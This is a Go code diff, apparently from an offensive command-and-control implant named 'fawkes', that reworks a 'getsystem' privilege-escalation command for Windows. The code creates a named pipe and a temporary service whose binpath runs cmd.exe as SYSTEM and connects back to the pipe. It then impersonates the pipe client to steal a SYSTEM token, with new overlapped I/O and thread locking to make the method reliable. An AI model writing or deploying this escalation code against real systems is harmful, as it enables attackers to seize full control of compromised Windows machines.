@@ -8,8 +8,8 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"runtime"
 	"strings"
-	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -20,18 +20,18 @@ import (
 
 // Windows API procedures for named pipe impersonation
 var (
-	procCreateNamedPipeW          = kernel32.NewProc("CreateNamedPipeW")
-	procConnectNamedPipe          = kernel32.NewProc("ConnectNamedPipe")
-	procDisconnectNamedPipe       = kernel32.NewProc("DisconnectNamedPipe")
+	procCreateNamedPipeW           = kernel32.NewProc("CreateNamedPipeW")
+	procConnectNamedPipe           = kernel32.NewProc("ConnectNamedPipe")
+	procDisconnectNamedPipe        = kernel32.NewProc("DisconnectNamedPipe")
 	procImpersonateNamedPipeClient = kernel32.NewProc("ImpersonateNamedPipeClient")
 )
 
 // Named pipe constants
 const (
-	PIPE_ACCESS_DUPLEX     = 0x00000003
-	PIPE_TYPE_BYTE         = 0x00000000
-	PIPE_READMODE_BYTE     = 0x00000000
-	PIPE_WAIT              = 0x00000000
+	PIPE_ACCESS_DUPLEX       = 0x00000003
+	PIPE_TYPE_BYTE           = 0x00000000
+	PIPE_READMODE_BYTE       = 0x00000000
+	PIPE_WAIT                = 0x00000000
 	PIPE_UNLIMITED_INSTANCES = 255
 )
 
@@ -85,6 +85,11 @@ func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
 // binpath writes to that pipe (running as SYSTEM), then impersonates the
 // connecting client to obtain a SYSTEM token.
 func getSystemViaService(oldIdentity string) structs.CommandResult {
+	// Lock OS thread — ImpersonateNamedPipeClient and OpenThreadToken
+	// must run on the same OS thread
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
 	// Generate random pipe name
 	pipeName, err := randomPipeName()
 	if err != nil {
@@ -96,7 +101,18 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 	}
 	pipeFullPath := `\\.\pipe\` + pipeName
 
-	// Create named pipe
+	// Create an event for overlapped I/O
+	hEvent, _, eventErr := procCreateEventW.Call(0, 1, 0, 0) // manual reset, initially non-signaled
+	if hEvent == 0 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("CreateEventW failed: %v", eventErr),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	defer windows.CloseHandle(windows.Handle(hEvent))
+
+	// Create named pipe with overlapped I/O for proper timeout support
 	pipeNamePtr, err := windows.UTF16PtrFromString(pipeFullPath)
 	if err != nil {
 		return structs.CommandResult{
@@ -108,12 +124,12 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 
 	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
 		uintptr(unsafe.Pointer(pipeNamePtr)),
-		PIPE_ACCESS_DUPLEX,
+		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
 		PIPE_TYPE_BYTE|PIPE_READMODE_BYTE|PIPE_WAIT,
 		PIPE_UNLIMITED_INSTANCES,
 		512,  // out buffer size
 		512,  // in buffer size
-		0,    // default timeout
+		5000, // default timeout (5s)
 		0,    // default security (allows SYSTEM)
 	)
 	if hPipe == uintptr(windows.InvalidHandle) {
@@ -124,6 +140,29 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 		}
 	}
 	defer windows.CloseHandle(windows.Handle(hPipe))
+
+	// Start overlapped ConnectNamedPipe BEFORE creating the service
+	// This ensures we're listening when the service starts
+	overlapped := windows.Overlapped{
+		HEvent: windows.Handle(hEvent),
+	}
+	ret, _, connectErr := procConnectNamedPipe.Call(
+		hPipe,
+		uintptr(unsafe.Pointer(&overlapped)),
+	)
+	if ret == 0 {
+		// Expected: ERROR_IO_PENDING means waiting for connection
+		// ERROR_PIPE_CONNECTED means client already connected
+		if connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("ConnectNamedPipe failed: %v", connectErr),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	}
+
+	alreadyConnected := (connectErr == windows.ERROR_PIPE_CONNECTED)
 
 	// Create a temporary service that writes to our pipe
 	svcName := "fwk" + pipeName[:8]
@@ -140,7 +179,7 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 	defer scm.Disconnect()
 
 	svcHandle, err := scm.CreateService(svcName, binPath, mgr.Config{
-		StartType:   uint32(mgr.StartManual),
+		StartType:    uint32(mgr.StartManual),
 		ErrorControl: mgr.ErrorIgnore,
 	})
 	if err != nil {
@@ -157,53 +196,25 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 		svcHandle.Close()
 	}()
 
-	// Start the service in a goroutine — it will connect to our pipe
-	// The service will fail to start properly (it's not a real service),
-	// but the SCM will execute the binpath as SYSTEM before it fails.
-	svcStarted := make(chan error, 1)
-	go func() {
-		err := svcHandle.Start()
-		svcStarted <- err
-	}()
+	// Start the service — the SCM will run cmd.exe as SYSTEM which connects to our pipe
+	// Start() returns quickly; the error is expected because cmd.exe isn't a real service
+	svcHandle.Start()
+	// Ignore error — cmd.exe is not a real service and will fail to report status
 
-	// Wait for pipe connection with timeout
-	// ConnectNamedPipe blocks until a client connects
-	connected := make(chan bool, 1)
-	connectErr := make(chan error, 1)
-	go func() {
-		ret, _, err := procConnectNamedPipe.Call(hPipe, 0)
-		if ret == 0 {
-			// ERROR_PIPE_CONNECTED means client already connected before we called
-			if err == windows.ERROR_PIPE_CONNECTED {
-				connected <- true
-				return
+	// Wait for the pipe connection (overlapped I/O)
+	if !alreadyConnected {
+		waitResult, _ := windows.WaitForSingleObject(windows.Handle(hEvent), 10000) // 10s timeout
+		if waitResult != windows.WAIT_OBJECT_0 {
+			return structs.CommandResult{
+				Output:    "Timeout waiting for service to connect to pipe (10s). Ensure you have SeImpersonate and admin privileges.",
+				Status:    "error",
+				Completed: true,
 			}
-			connectErr <- fmt.Errorf("ConnectNamedPipe failed: %v", err)
-			return
-		}
-		connected <- true
-	}()
-
-	// Wait for connection or timeout
-	select {
-	case <-connected:
-		// Client connected to pipe
-	case err := <-connectErr:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Pipe connection failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
-	case <-time.After(10 * time.Second):
-		return structs.CommandResult{
-			Output:    "Timeout waiting for service to connect to pipe (10s). Ensure you have SeImpersonate and admin privileges.",
-			Status:    "error",
-			Completed: true,
 		}
 	}
 
 	// Impersonate the connected client (SYSTEM)
-	ret, _, err := procImpersonateNamedPipeClient.Call(hPipe)
+	ret, _, err = procImpersonateNamedPipeClient.Call(hPipe)
 	if ret == 0 {
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v (need SeImpersonate privilege)", err),
@@ -259,14 +270,6 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 			Status:    "error",
 			Completed: true,
 		}
-	}
-
-	// Wait for service start goroutine to finish (service will fail, that's expected)
-	select {
-	case <-svcStarted:
-		// Ignore error — service start always "fails" because cmd.exe isn't a real service
-	case <-time.After(5 * time.Second):
-		// Timeout is fine — we already got the token
 	}
 
 	// Verify the new identity
